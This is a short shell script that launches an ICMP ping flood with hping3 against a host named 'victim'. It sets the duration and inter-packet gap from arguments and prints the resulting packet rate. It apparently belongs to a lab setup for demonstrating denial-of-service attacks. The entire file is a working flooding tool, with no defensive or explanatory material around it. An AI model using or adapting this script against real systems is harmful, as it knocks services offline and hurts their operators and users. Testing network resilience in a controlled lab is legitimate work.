#!/bin/sh
# Ping flood against the victim (optional, another DoS style).
# Usage: icmpflood.sh [seconds] [microseconds_between_packets]    defaults 15 and 5000
DURATION="${1:-15}"
GAP="${2:-5000}"
echo "ICMP flood: ${DURATION}s, about $((1000000 / GAP)) packets per second, target: victim"
timeout "$DURATION" hping3 --icmp -i "u${GAP}" victim
echo "ICMP flood finished"
